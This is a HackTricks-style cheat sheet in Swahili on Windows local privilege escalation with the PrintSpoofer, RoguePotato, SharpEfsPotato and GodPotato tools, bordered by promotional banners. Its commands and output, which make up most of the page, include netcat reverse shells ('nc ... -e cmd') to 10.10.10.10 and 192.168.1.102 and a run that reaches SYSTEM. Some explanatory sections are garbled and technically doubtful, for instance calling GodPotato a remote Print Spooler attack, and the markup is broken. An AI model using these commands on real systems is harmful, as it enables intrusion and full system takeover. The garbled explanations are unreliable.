# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

{% hint style="warning" %}
**JuicyPotato haifanyi kazi** kwenye Windows Server 2019 na Windows 10 toleo la 1809 na baadaye. Walakini, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) inaweza kutumika kuchukua nafasi sawa na kupata ufikiaji wa kiwango cha `NT AUTHORITY\SYSTEM`. Chapisho hili la blogu linatoa maelezo ya kina juu ya zana ya `PrintSpoofer`, ambayo inaweza kutumika kudhulumu mamlaka za udanganyifu kwenye mwenyeji wa Windows 10 na Server 2019 ambapo JuicyPotato haifanyi kazi tena.
{% endhint %}

## Onyesho Rahisi

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
### RoguePotato

{% code overflow="wrap" %}
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
{% code %}

### SharpEfsPotato

SharpEfsPotato ni zana ya uchomaji ya Windows ambayo inaweza kutumiwa kutekeleza shambulio la kusudi la kusudi (LPE) kwenye mfumo wa Windows. Zana hii inatumia udhaifu katika mchakato wa kusindika faili ya EFS (Encrypting File System) ili kujipatia mamlaka ya juu ya mfumo.

#### Jinsi Inavyofanya Kazi

SharpEfsPotato inafanya kazi kwa kuchanganya udhaifu katika mchakato wa kusindika faili ya EFS na udhaifu katika mchakato wa kusindika faili ya COM (Component Object Model). Kwa kufanya hivyo, inaweza kutekeleza shambulio la kusudi la kusudi na kujipatia mamlaka ya juu ya mfumo.

#### Jinsi ya Kutumia SharpEfsPotato

1. Pakua na usakinishe zana ya SharpEfsPotato kwenye mfumo wako wa Windows.
2. Fungua terminal na endesha zana kwa kutumia amri ifuatayo:

   ```
   SharpEfsPotato.exe
   ```

3. Zana itajaribu kutekeleza shambulio la kusudi la kusudi na kujipatia mamlaka ya juu ya mfumo. Ikiwa shambulio linafanikiwa, utapata mamlaka ya juu ya mfumo.

#### Tahadhari

Ni muhimu kutambua kuwa kutumia SharpEfsPotato ni kinyume cha sheria na inaweza kusababisha madhara makubwa. Ni muhimu kuzingatia sheria na kufanya shughuli za uchomaji tu kwa idhini sahihi na kwa madhumuni halali.

{% endcode %}
```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### GodPotato

GodPotato ni mbinu ya kufanya uchomaji wa kawaida wa kijijini kwa kutumia udhaifu katika huduma ya Print Spooler ya Windows. Mbinu hii inaruhusu mtumiaji mwenye ruhusa ya chini kutekeleza amri kwa kiwango cha juu cha ruhusa.

#### Jinsi ya Kutumia GodPotato

1. Pakua GodPotato kutoka kwenye uhifadhi wa GitHub.
2. Weka faili ya GodPotato kwenye mfumo wa lengo.
3. Fungua terminal na endesha amri ifuatayo: `.\GodPotato.exe -c "amri_ya_kutekeleza"`.
4. Amri itatekelezwa kwa kiwango cha juu cha ruhusa.

#### Kuzuia GodPotato

Ili kuzuia shambulio la GodPotato, unaweza kufuata hatua zifuatazo:

1. Lemaza huduma ya Print Spooler ikiwa haifai kwa mfumo wako.
2. Hakikisha mfumo wako una sasisho za usalama za hivi karibuni.
3. Fuatilia na angalia mara kwa mara mabadiliko yoyote katika mfumo wako.
4. Tumia ufumbuzi wa usalama uliopendekezwa na wauzaji wa mfumo wako.

Kwa kufuata hatua hizi, unaweza kuzuia shambulio la GodPotato na kuhakikisha usalama wa mfumo wako.
```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
## Marejeo
* [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
* [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
* [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
* [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
* [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
